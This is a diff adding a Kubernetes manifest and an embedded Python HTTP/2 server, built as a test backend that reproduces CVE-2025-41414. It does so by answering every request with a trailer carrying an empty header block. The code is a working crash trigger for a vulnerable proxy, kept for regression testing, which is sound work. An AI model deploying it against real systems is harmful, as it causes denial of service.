@@ -1,0 +1,143 @@
+# An HTTP/2 origin that answers with a TRAILER CARRYING ZERO HEADERS.
+#
+# WHY IT EXISTS. CVE-2025-41414 is reached only through that exact response shape:
+# `frame` is NULL when the HPACK-serialised header block comes out empty, and
+# http2_from_http_data always writes at least one byte for a non-trailer, so the
+# empty case is reachable ONLY via a trailer that carries no headers
+# (cve-41414-demonstration.md).
+#
+# WHY IT IS A MANIFEST AND NOT A SCRIPT SOMEONE RUNS. The original demonstration
+# used a Python process started by hand in a scratch directory. It served its
+# purpose and then vanished with the session, which is why the CVE demo could not
+# be re-run on 2026-09-05 -- the crash vector had no durable home. A ConfigMap plus
+# a Pod is version-controlled, survives a session, and can be read by someone who
+# was not here.
+#
+#   kubectl apply -f env/k8s/h2-trailer-backend.yaml
+#   kubectl get pod h2-trailer-backend -n default
+#
+# It listens h2c (prior knowledge, no TLS, no ALPN) on 22.22.22.111:8080, which is
+# on the server-side network TMM reaches. Point a pool at it and give the virtual
+# server http2.serverside so TMM speaks HTTP/2 to it.
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: h2-trailer-backend
+  namespace: default
+data:
+  backend.py: |
+    #!/usr/bin/env python3
+    """h2c origin whose every response ends in a trailer with an EMPTY header block.
+
+    Two things here are not incidental, and both were found the hard way:
+
+      * IT MUST NOT SEND AN UNSOLICITED SETTINGS ACK. The first version ACKed
+        before the peer had sent SETTINGS, which is a connection error under
+        RFC 7540 6.5.3, and TMM closed the connection before any response.
+      * IT MUST SERVE MANY EXCHANGES PER CONNECTION AND MANY CONNECTIONS. TMM
+        pools serverside connections, so a backend that answers once and closes
+        looks like an intermittent backend rather than a finished one.
+    """
+    import socket, struct, sys, threading
+
+    DATA, HEADERS, SETTINGS, WINDOW_UPDATE = 0x0, 0x1, 0x4, 0x8
+    END_STREAM, END_HEADERS, ACK, PRIORITY = 0x1, 0x4, 0x1, 0x20
+    PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+
+    def frame(ftype, flags, sid, payload=b""):
+        return struct.pack(">I", len(payload))[1:] + bytes([ftype, flags]) + \
+               struct.pack(">I", sid) + payload
+
+    def recv_exactly(c, n):
+        buf = b""
+        while len(buf) < n:
+            b = c.recv(n - len(buf))
+            if not b:
+                return None
+            buf += b
+        return buf
+
+    def respond(c, sid):
+        # 0x88 is HPACK static index 8 == ":status: 200". One byte, so the
+        # RESPONSE header block is non-empty and takes the ordinary path.
+        c.sendall(frame(HEADERS, END_HEADERS, sid, b"\x88"))
+        # A zero-length DATA frame without END_STREAM: there is a body, and it
+        # is empty, so the trailer below is the thing that ends the stream.
+        c.sendall(frame(DATA, 0, sid, b""))
+        # THE VECTOR. A trailer whose payload is ONLY the 5-byte priority field
+        # (4-byte stream dependency + 1-byte weight) and no header block at all,
+        # so the serialised block length is zero. Flags 0x25 =
+        # END_STREAM | END_HEADERS | PRIORITY.
+        c.sendall(frame(HEADERS, END_STREAM | END_HEADERS | PRIORITY, sid,
+                        bytes.fromhex("000000000f")))
+
+    def serve(c, addr):
+        try:
+            if recv_exactly(c, len(PREFACE)) != PREFACE:
+                return
+            c.sendall(frame(SETTINGS, 0, 0))          # ours; NOT an ack
+            while True:
+                head = recv_exactly(c, 9)
+                if head is None:
+                    return
+                ln = int.from_bytes(head[0:3], "big")
+                ftype, flags = head[3], head[4]
+                sid = struct.unpack(">I", head[5:9])[0] & 0x7FFFFFFF
+                body = recv_exactly(c, ln) if ln else b""
+                if body is None:
+                    return
+                if ftype == SETTINGS and not (flags & ACK):
+                    c.sendall(frame(SETTINGS, ACK, 0))  # ack THEIRS, only now
+                elif ftype == HEADERS and (flags & END_STREAM) and sid:
+                    respond(c, sid)
+                elif ftype == DATA and (flags & END_STREAM) and sid:
+                    respond(c, sid)
+        except (ConnectionError, OSError):
+            pass
+        finally:
+            try:
+                c.close()
+            except OSError:
+                pass
+
+    def main():
+        host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
+        port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((host, port))
+        s.listen(64)
+        print("h2 trailer backend on %s:%d" % (host, port), flush=True)
+        while True:
+            c, a = s.accept()
+            threading.Thread(target=serve, args=(c, a), daemon=True).start()
+
+    main()
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: h2-trailer-backend
+  namespace: default
+  annotations:
+    k8s.v1.cni.cncf.io/networks: |
+      [{"name":"server-net","interface":"server-net","ips":["22.22.22.111/24"]}]
+    eob-tmm/purpose: "HTTP/2 origin that answers with a zero-header trailer --- the CVE-2025-41414 vector"
+spec:
+  nodeName: vs-worker
+  containers:
+    - name: backend
+      image: artifactory.f5net.com/f5-positron-docker/testing-utils:v1.1.2
+      command: ["/bin/sh", "-c"]
+      args:
+        - "python3 /opt/h2/backend.py 0.0.0.0 8080"
+      volumeMounts:
+        - name: script
+          mountPath: /opt/h2
+      securityContext:
+        capabilities:
+          add: ["NET_ADMIN"]
+  volumes:
+    - name: script
+      configMap:
+        name: h2-trailer-backend
